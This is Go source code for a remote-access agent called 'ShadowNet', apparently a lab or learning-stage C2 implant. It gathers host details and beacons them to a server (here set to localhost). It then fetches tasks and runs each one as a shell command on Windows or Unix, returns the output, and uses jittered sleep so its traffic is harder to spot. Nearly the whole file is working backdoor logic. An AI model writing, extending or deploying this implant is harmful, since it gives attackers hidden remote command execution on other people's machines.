package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

/*
-------------------------------
 DATA STRUCTURES
-------------------------------
*/

type AgentInfo struct {
	Agent    string `json:"agent"`
	Hostname string `json:"hostname,omitempty"`
	OS       string `json:"os,omitempty"`
	Arch     string `json:"arch,omitempty"`
	Status   string `json:"status"`
	Output   string `json:"output,omitempty"`
}

type Task struct {
	Task string `json:"task"`
}

/*
-------------------------------
 SYSTEM INFO
-------------------------------
*/

func collectFullSystemInfo() AgentInfo {
	host, _ := os.Hostname()

	return AgentInfo{
		Agent:    "go-agent",
		Hostname: host,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Status:   "alive",
	}
}

func collectHeartbeat() AgentInfo {
	return AgentInfo{
		Agent:  "go-agent",
		Status: "alive",
	}
}

/*
-------------------------------
 COMMAND EXECUTION
-------------------------------
*/

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}

	return string(output)
}

/*
-------------------------------
 BEACON COMMUNICATION
-------------------------------
*/

func sendBeacon(info AgentInfo) (Task, error) {
	data, _ := json.Marshal(info)

	resp, err := http.Post(
		"http://127.0.0.1:8080/beacon",
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return Task{}, err
	}
	defer resp.Body.Close()

	var task Task
	err = json.NewDecoder(resp.Body).Decode(&task)
	return task, err
}

/*
-------------------------------
 JITTER SLEEP (STAGE 07)
-------------------------------
*/

func jitterSleep(base int) {
	jitter := rand.Intn(base) - (base / 2)
	sleepTime := base + jitter

	if sleepTime < 1 {
		sleepTime = 1
	}

	time.Sleep(time.Duration(sleepTime) * time.Second)
}

/*
-------------------------------
 MAIN LOOP
-------------------------------
*/

func main() {
	fmt.Println("[*] ShadowNet agent started")

	rand.Seed(time.Now().UnixNano())

	firstRun := true
	var lastTask string

	for {
		var info AgentInfo

		// First run → full system info
		if firstRun {
			info = collectFullSystemInfo()
			firstRun = false
		} else {
			// Later runs → heartbeat only
			info = collectHeartbeat()
		}

		task, err := sendBeacon(info)
		if err != nil {
			fmt.Println("[!] Beacon failed:", err)
			jitterSleep(10)
			continue
		}

		// Execute task once
		if task.Task != "" && task.Task != lastTask {
			fmt.Println("[*] Executing task:", task.Task)

			output := executeCommand(task.Task)
			info.Output = output
			sendBeacon(info)

			lastTask = task.Task
		}

		// 🔥 Jittered sleep instead of fixed sleep
		jitterSleep(10)
	}
}